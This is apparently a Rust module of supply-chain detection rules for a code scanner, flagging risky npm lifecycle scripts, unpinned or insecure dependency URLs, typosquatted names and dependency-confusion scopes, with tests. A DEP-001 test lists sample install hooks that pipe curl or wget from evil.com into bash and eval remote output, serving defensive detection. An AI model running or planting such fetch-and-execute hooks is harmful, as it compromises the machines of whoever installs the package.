use crate::rules::types::{Category, Confidence, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![
        dep_001(),
        dep_002(),
        dep_003(),
        dep_004(),
        dep_005(),
        dep_006(),
        dep_007(),
        dep_008(),
        dep_009(),
        dep_010(),
    ]
}

fn dep_001() -> Rule {
    Rule {
        id: "DEP-001",
        name: "Dangerous lifecycle script",
        description: "Detects potentially dangerous scripts in package.json lifecycle hooks (postinstall, preinstall, etc.)",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // postinstall/preinstall with curl/wget piped to shell
            Regex::new(
                r#""(post|pre)install"\s*:\s*"[^"]*\b(curl|wget)\b[^"]*\|\s*(bash|sh|node)"#,
            )
            .expect("DEP-001: invalid regex"),
            // postinstall/preinstall with eval
            Regex::new(r#""(post|pre)install"\s*:\s*"[^"]*\beval\b"#)
                .expect("DEP-001: invalid regex"),
            // postinstall/preinstall downloading and executing
            Regex::new(r#""(post|pre)install"\s*:\s*"[^"]*&&\s*(bash|sh|node)\s"#)
                .expect("DEP-001: invalid regex"),
            // npm explore combined with script execution
            Regex::new(r#""(post|pre)install"\s*:\s*"[^"]*npm\s+explore"#)
                .expect("DEP-001: invalid regex"),
        ],
        exclusions: vec![],
        message: "Dangerous lifecycle script detected: may download and execute arbitrary code",
        recommendation: "Review the postinstall/preinstall script carefully. Consider removing or sandboxing it.",
        fix_hint: Some("Remove dangerous network operations from lifecycle scripts"),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn dep_002() -> Rule {
    Rule {
        id: "DEP-002",
        name: "Git URL dependency",
        description: "Detects dependencies installed directly from git URLs without version pinning",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // npm: git://, git+https://, git+ssh://, github:
            Regex::new(r#":\s*"(git://|git\+https://|git\+ssh://|github:)[^"]*"#)
                .expect("DEP-002: invalid regex"),
            // Cargo: git = "..."
            Regex::new(r#"\bgit\s*=\s*"https?://[^"]*""#).expect("DEP-002: invalid regex"),
            // pip: git+ in requirements
            Regex::new(r"^git\+https?://").expect("DEP-002: invalid regex"),
        ],
        exclusions: vec![],
        message: "Git URL dependency detected: version is not pinned to a specific commit or tag",
        recommendation: "Pin the dependency to a specific commit hash or tag for reproducibility",
        fix_hint: Some("Add #commit=<hash> or pin to a specific tag"),
        cwe_ids: &["CWE-829", "CWE-1357"],
    }
}

fn dep_003() -> Rule {
    Rule {
        id: "DEP-003",
        name: "Wildcard version dependency",
        description: "Detects dependencies using wildcard versions (*) that can lead to supply chain attacks",
        severity: Severity::Medium,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // npm: "package": "*"
            Regex::new(r#":\s*"\*""#).expect("DEP-003: invalid regex"),
            // npm: "package": "latest"
            Regex::new(r#":\s*"latest""#).expect("DEP-003: invalid regex"),
            // Cargo: version = "*"
            Regex::new(r#"version\s*=\s*"\*""#).expect("DEP-003: invalid regex"),
        ],
        exclusions: vec![],
        message: "Wildcard version dependency detected: any version can be installed",
        recommendation: "Pin dependencies to specific versions or version ranges",
        fix_hint: Some("Replace \"*\" with a specific version like \"^1.0.0\""),
        cwe_ids: &["CWE-1357"],
    }
}

fn dep_004() -> Rule {
    Rule {
        id: "DEP-004",
        name: "HTTP dependency URL",
        description: "Detects dependencies fetched over insecure HTTP instead of HTTPS",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // http:// URLs in dependencies
            Regex::new(r#":\s*"http://[^"]*""#).expect("DEP-004: invalid regex"),
            Regex::new(r#"registry\s*=\s*"http://[^"]*""#).expect("DEP-004: invalid regex"),
            Regex::new(r"^http://").expect("DEP-004: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1|::1").expect("DEP-004: invalid regex"),
        ],
        message: "Insecure HTTP dependency URL detected: vulnerable to MITM attacks",
        recommendation: "Use HTTPS URLs for all dependencies",
        fix_hint: Some("Change http:// to https://"),
        cwe_ids: &["CWE-829", "CWE-319"],
    }
}

fn dep_005() -> Rule {
    Rule {
        id: "DEP-005",
        name: "Tarball/file URL dependency",
        description: "Detects dependencies installed from direct tarball or file URLs",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // Direct tarball URLs
            Regex::new(r#":\s*"https?://[^"]*\.(tar\.gz|tgz|tar|zip)""#)
                .expect("DEP-005: invalid regex"),
            // file:// URLs
            Regex::new(r#":\s*"file://[^"]*""#).expect("DEP-005: invalid regex"),
        ],
        exclusions: vec![],
        message: "Direct file/tarball dependency detected: bypasses package registry security",
        recommendation: "Use package registry versions instead of direct file URLs",
        fix_hint: Some("Publish the package to a registry or use git with commit pinning"),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn dep_006() -> Rule {
    Rule {
        id: "DEP-006",
        name: "Postinstall script execution",
        description: "Detects postinstall scripts that may execute arbitrary code",
        severity: Severity::Medium,
        category: Category::SupplyChain,
        confidence: Confidence::Tentative,
        patterns: vec![
            Regex::new(r#""postinstall"\s*:\s*"[^"]+""#).expect("DEP-006: invalid regex"),
            Regex::new(r#""install"\s*:\s*"[^"]+""#).expect("DEP-006: invalid regex"),
        ],
        exclusions: vec![
            // Common safe postinstall scripts
            Regex::new(r"node-gyp|husky|patch-package|ngcc|postinstall-postinstall")
                .expect("DEP-006: invalid regex"),
        ],
        message: "Postinstall script detected. These scripts run automatically after npm install.",
        recommendation: "Review the postinstall script to ensure it's safe. Consider using --ignore-scripts.",
        fix_hint: Some("npm install --ignore-scripts or review the script manually"),
        cwe_ids: &["CWE-829"],
    }
}

fn dep_007() -> Rule {
    Rule {
        id: "DEP-007",
        name: "Preinstall script execution",
        description: "Detects preinstall scripts that execute before package installation",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r#""preinstall"\s*:\s*"[^"]+""#).expect("DEP-007: invalid regex"),
        ],
        exclusions: vec![],
        message: "Preinstall script detected. These scripts run before installation completes.",
        recommendation: "Preinstall scripts are higher risk. Review carefully before proceeding.",
        fix_hint: Some("npm install --ignore-scripts or review the script manually"),
        cwe_ids: &["CWE-829"],
    }
}

fn dep_008() -> Rule {
    Rule {
        id: "DEP-008",
        name: "Typosquatting package name",
        description: "Detects common typosquatting patterns in package names",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Tentative,
        patterns: vec![
            // Common typosquatting patterns for popular packages
            Regex::new(r#""(loadash|lodahs|lod-ash|l0dash)"\s*:"#).expect("DEP-008: invalid regex"),
            Regex::new(r#""(reacct|reactt|re-act|raect)"\s*:"#).expect("DEP-008: invalid regex"),
            Regex::new(r#""(expresss|expres|ex-press|exppress)"\s*:"#)
                .expect("DEP-008: invalid regex"),
            Regex::new(r#""(axois|axioss|ax-ios|axos)"\s*:"#).expect("DEP-008: invalid regex"),
            Regex::new(r#""(momnet|momentt|mom-ent|momen)"\s*:"#).expect("DEP-008: invalid regex"),
        ],
        exclusions: vec![],
        message: "Potential typosquatting package detected. Verify the package name is correct.",
        recommendation: "Check the official package name and correct any typos.",
        fix_hint: Some("Verify package name at npmjs.com before installing"),
        cwe_ids: &["CWE-494", "CWE-1357"],
    }
}

fn dep_009() -> Rule {
    Rule {
        id: "DEP-009",
        name: "Dependency confusion pattern",
        description: "Detects internal/private package naming patterns that may be vulnerable to dependency confusion",
        severity: Severity::Medium,
        category: Category::SupplyChain,
        confidence: Confidence::Tentative,
        patterns: vec![
            // Common internal package prefixes
            Regex::new(r#""@internal/[^"]+"\s*:"#).expect("DEP-009: invalid regex"),
            Regex::new(r#""@private/[^"]+"\s*:"#).expect("DEP-009: invalid regex"),
            Regex::new(r#""@corp/[^"]+"\s*:"#).expect("DEP-009: invalid regex"),
            Regex::new(r#""@company/[^"]+"\s*:"#).expect("DEP-009: invalid regex"),
        ],
        exclusions: vec![],
        message: "Internal package naming pattern detected. Ensure private registry is configured.",
        recommendation: "Configure .npmrc to use private registry for internal packages.",
        fix_hint: Some("Add @scope:registry=https://your-private-registry in .npmrc"),
        cwe_ids: &["CWE-427", "CWE-1357"],
    }
}

fn dep_010() -> Rule {
    Rule {
        id: "DEP-010",
        name: "Unpinned major version",
        description: "Detects dependencies with unpinned major versions (^0.x or >=)",
        severity: Severity::Low,
        category: Category::SupplyChain,
        confidence: Confidence::Tentative,
        patterns: vec![
            // ^0.x.x allows breaking changes
            Regex::new(r#":\s*"\^0\.\d+\.\d+""#).expect("DEP-010: invalid regex"),
            // >= without upper bound
            Regex::new(r#":\s*">=\d+\.\d+\.\d+""#).expect("DEP-010: invalid regex"),
            // > without upper bound
            Regex::new(r#":\s*">\d+\.\d+\.\d+""#).expect("DEP-010: invalid regex"),
        ],
        exclusions: vec![],
        message: "Unpinned version range detected. May allow unexpected major version upgrades.",
        recommendation: "Use exact versions or tilde ranges for better reproducibility.",
        fix_hint: Some("Use exact version (1.2.3) or tilde range (~1.2.3)"),
        cwe_ids: &["CWE-1357"],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dep_001_detects_dangerous_postinstall() {
        let rules = rules();
        let dep_001 = rules.iter().find(|r| r.id == "DEP-001").unwrap();

        let dangerous_scripts = vec![
            r#""postinstall": "curl http://evil.com/script.sh | bash""#,
            r#""preinstall": "wget http://evil.com/install.sh | sh""#,
            r#""postinstall": "eval $(curl http://evil.com)""#,
            r#""preinstall": "curl http://evil.com/setup && bash setup""#,
        ];

        for script in dangerous_scripts {
            let matched = dep_001.patterns.iter().any(|p| p.is_match(script));
            assert!(matched, "Should detect dangerous script: {}", script);
        }
    }

    #[test]
    fn test_dep_002_detects_git_url() {
        let rules = rules();
        let dep_002 = rules.iter().find(|r| r.id == "DEP-002").unwrap();

        let git_urls = vec![
            r#": "git://github.com/user/repo""#,
            r#": "git+https://github.com/user/repo""#,
            r#": "github:user/repo""#,
            r#"git = "https://github.com/user/repo""#,
        ];

        for url in git_urls {
            let matched = dep_002.patterns.iter().any(|p| p.is_match(url));
            assert!(matched, "Should detect git URL: {}", url);
        }
    }

    #[test]
    fn test_dep_003_detects_wildcard_version() {
        let rules = rules();
        let dep_003 = rules.iter().find(|r| r.id == "DEP-003").unwrap();

        let wildcards = vec![r#": "*""#, r#": "latest""#, r#"version = "*""#];

        for wildcard in wildcards {
            let matched = dep_003.patterns.iter().any(|p| p.is_match(wildcard));
            assert!(matched, "Should detect wildcard version: {}", wildcard);
        }
    }

    #[test]
    fn test_dep_004_detects_http_url() {
        let rules = rules();
        let dep_004 = rules.iter().find(|r| r.id == "DEP-004").unwrap();

        let http_urls = vec![
            r#": "http://example.com/package.tar.gz""#,
            r#"registry = "http://insecure-registry.com""#,
        ];

        for url in http_urls {
            let matched = dep_004.patterns.iter().any(|p| p.is_match(url));
            assert!(matched, "Should detect HTTP URL: {}", url);
        }

        // Should not match localhost
        let localhost = r#": "http://localhost:4873/package""#;
        let matched = dep_004.patterns.iter().any(|p| p.is_match(localhost));
        let excluded = dep_004.exclusions.iter().any(|e| e.is_match(localhost));
        assert!(matched && excluded, "Should exclude localhost");
    }

    #[test]
    fn test_dep_005_detects_tarball_url() {
        let rules = rules();
        let dep_005 = rules.iter().find(|r| r.id == "DEP-005").unwrap();

        let tarball_urls = vec![
            r#": "https://example.com/package.tar.gz""#,
            r#": "https://example.com/package.tgz""#,
            r#": "file:///home/user/package""#,
        ];

        for url in tarball_urls {
            let matched = dep_005.patterns.iter().any(|p| p.is_match(url));
            assert!(matched, "Should detect tarball/file URL: {}", url);
        }
    }

    #[test]
    fn test_all_rules_have_cwe_ids() {
        for rule in rules() {
            assert!(
                !rule.cwe_ids.is_empty(),
                "Rule {} should have CWE IDs",
                rule.id
            );
        }
    }

    #[test]
    fn test_all_rules_have_supply_chain_category() {
        for rule in rules() {
            assert_eq!(
                rule.category,
                Category::SupplyChain,
                "Rule {} should be SupplyChain category",
                rule.id
            );
        }
    }

    // Snapshot tests
    #[test]
    fn snapshot_dep_001() {
        let rule = dep_001();
        let content = include_str!("../../../tests/fixtures/rules/dep_001.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("dep_001", findings);
    }

    #[test]
    fn snapshot_dep_002() {
        let rule = dep_002();
        let content = include_str!("../../../tests/fixtures/rules/dep_002.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("dep_002", findings);
    }

    #[test]
    fn snapshot_dep_003() {
        let rule = dep_003();
        let content = include_str!("../../../tests/fixtures/rules/dep_003.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("dep_003", findings);
    }

    #[test]
    fn snapshot_dep_004() {
        let rule = dep_004();
        let content = include_str!("../../../tests/fixtures/rules/dep_004.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("dep_004", findings);
    }

    #[test]
    fn snapshot_dep_005() {
        let rule = dep_005();
        let content = include_str!("../../../tests/fixtures/rules/dep_005.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("dep_005", findings);
    }
}
